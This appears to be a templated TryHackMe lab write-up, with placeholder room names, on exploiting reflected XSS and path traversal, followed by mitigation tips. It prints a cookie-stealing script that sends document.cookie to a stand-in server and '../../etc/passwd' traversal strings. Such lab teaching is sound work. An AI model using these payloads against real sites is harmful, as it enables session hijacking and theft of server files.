TryHackMe Room: [Room Name] Official Write-Up
Introduction

Welcome to the [Room Name]! This room is designed to test your skills in identifying and exploiting web vulnerabilities, including Cross-Site Scripting (XSS) and Path Traversal. This write-up serves as a guide for solving the room while understanding the underlying principles of each vulnerability.
Task 1: Cross-Site Scripting (XSS)
Scenario

The web application includes a search feature vulnerable to XSS. Malicious actors can exploit this vulnerability to inject scripts, leading to session hijacking, defacement, or other malicious activities.
Steps to Exploit

    Identify the Input Field:
        Navigate to the search functionality.
        Enter a harmless input such as test and observe the reflected output.

    Inject XSS Payload:
        Try a basic payload such as:

    <script>alert('XSS');</script>

    If the alert box appears, the application is vulnerable.

Exploit Further:

    Use payloads to steal cookies or perform other actions:

        <script>document.location='http://yourserver.com?c='+document.cookie;</script>

    Mitigation:
        Recommend input sanitization and encoding outputs.

Task 2: Path Traversal
Scenario

The application exposes a file download feature without proper validation of the file paths. This allows attackers to traverse directories and access unauthorized files on the server.
Steps to Exploit

    Locate the Vulnerable Endpoint:
        Identify a feature like /download?file=<filename>.

    Test for Path Traversal:
        Replace <filename> with ../../etc/passwd or variations:

        ../../../../etc/passwd

        If successful, sensitive files like /etc/passwd or configuration files are exposed.

    Exploit Further:
        Use automated tools like dirbuster to identify accessible files.
        Extract sensitive information, such as credentials or configurations.

    Mitigation:
        Implement strict input validation and use whitelists for accessible files.

Final Notes

    Lessons Learned:
        Understand the importance of secure coding practices to prevent vulnerabilities.
        Learn how attackers leverage these vulnerabilities for malicious purposes.

    Extra Challenges:
        Introduce security headers to mitigate XSS.
        Harden directory permissions to avoid Path Traversal.

    Room Creator’s Message: Thank you for participating! We hope you enjoyed solving this room and learned valuable techniques to secure your applications.
